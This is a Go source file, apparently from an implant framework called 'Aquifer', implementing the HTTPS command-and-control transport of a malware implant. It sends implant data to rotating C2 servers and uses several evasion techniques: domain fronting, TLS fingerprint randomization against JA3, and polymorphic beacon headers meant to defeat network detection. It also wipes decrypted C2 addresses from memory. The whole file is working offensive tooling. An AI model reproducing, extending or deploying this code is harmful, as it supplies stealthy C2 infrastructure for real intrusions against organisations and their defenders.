package c2

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"sync"
	"sync/atomic"
	"time"

	"github.com/Real-Fruit-Snacks/Aquifer/pkg/opsec"
)

// HTTPSTransport implements the Transport interface over HTTPS.
// It supports domain fronting, server rotation, and proxy detection.
type HTTPSTransport struct {
	mu             sync.RWMutex
	serversFn      func() [][]byte
	currentIdx     atomic.Int64
	frontingDomain string
	frontingHost   string
	implantID      string
	client         *http.Client
	beacon         *PolymorphicBeacon
}

// NewHTTPSTransport creates an HTTPS transport with domain fronting support.
// servers is the list of C2 endpoints to rotate through on failure.
func NewHTTPSTransport(serversFn func() [][]byte, frontingDomain string, frontingHost string, implantID string) *HTTPSTransport {
	// Use randomized TLS parameters to defeat JA3 fingerprinting.
	// Each transport instance gets a unique cipher suite order and
	// curve preference set, producing a different JA3 hash.
	tlsCfg := RandomizedTLSConfig()

	// When domain fronting, override the randomized SNI with the
	// legitimate fronting domain so CDN routing works correctly.
	if frontingDomain != "" {
		tlsCfg.ServerName = frontingDomain
	}

	// Use standard proxy detection which respects NO_PROXY.
	proxyFunc := http.ProxyFromEnvironment

	transport := &http.Transport{
		TLSClientConfig:   tlsCfg,
		Proxy:             proxyFunc,
		DisableKeepAlives: true,
	}

	t := &HTTPSTransport{
		serversFn:      serversFn,
		frontingDomain: frontingDomain,
		frontingHost:   frontingHost,
		implantID:      implantID,
		beacon:         NewPolymorphicBeacon(),
		client: &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		},
	}
	return t
}

// Send transmits data to the current C2 server via HTTPS POST.
// On failure it rotates to the next server in the list.
// The server URLs are obtained as [][]byte and shredded after use so that
// decrypted C2 addresses do not persist on the heap.
func (h *HTTPSTransport) Send(data []byte) ([]byte, error) {
	servers := h.serversFn()
	defer opsec.ShredServerList(servers) // guaranteed shred even on error

	if len(servers) == 0 {
		return nil, fmt.Errorf("no C2 servers configured")
	}

	var lastErr error
	for range servers {
		idx := h.currentIdx.Load() % int64(len(servers))
		target := string(servers[idx]) // short-lived string for HTTP request

		resp, err := h.doPost(target, data)
		if err == nil {
			return resp, nil
		}
		lastErr = err
		// Rotate to next server.
		h.currentIdx.Add(1)
	}

	return nil, fmt.Errorf("all HTTPS servers exhausted: %w", lastErr)
}

// Close releases resources held by the HTTP client.
func (h *HTTPSTransport) Close() error {
	h.mu.Lock()
	defer h.mu.Unlock()
	if t, ok := h.client.Transport.(*http.Transport); ok {
		t.CloseIdleConnections()
	}
	return nil
}

// FlushConnections closes all idle connections and forces the next request
// to establish a fresh TCP+TLS session, clearing URL strings from heap.
func (h *HTTPSTransport) FlushConnections() {
	h.mu.RLock()
	defer h.mu.RUnlock()
	if t, ok := h.client.Transport.(*http.Transport); ok {
		t.CloseIdleConnections()
	}
}

// doPost performs a single HTTP POST to the target URL with domain
// fronting headers applied and browser-mimicking headers set.
func (h *HTTPSTransport) doPost(target string, data []byte) ([]byte, error) {
	req, err := http.NewRequest(http.MethodPost, target, bytes.NewReader(data))
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}

	// Apply domain fronting if configured.
	if h.frontingDomain != "" && h.frontingHost != "" {
		ApplyFronting(req, h.frontingDomain, h.frontingHost)
	}

	// Apply polymorphic beacon profile: rotates path, method, content-type,
	// accept, user-agent, and extra headers each cycle to defeat NDR signatures.
	profile := h.beacon.NextProfile()
	req.Method = profile.Method
	req.URL.Path = profile.Path
	req.Header.Set("Content-Type", profile.ContentType)
	req.Header.Set("Accept", profile.Accept)
	req.Header.Set("User-Agent", profile.UserAgent)
	for k, v := range profile.Headers {
		req.Header.Set(k, v)
	}

	// Set deterministic implant ID for O(1) session lookup on the C2.
	// This MUST come after profile application so it is never overwritten.
	if h.implantID != "" {
		req.Header.Set("X-Request-ID", h.implantID)
	}

	resp, err := h.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http post: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 10*1024*1024))
	if err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("server returned HTTP %d", resp.StatusCode)
	}

	return body, nil
}
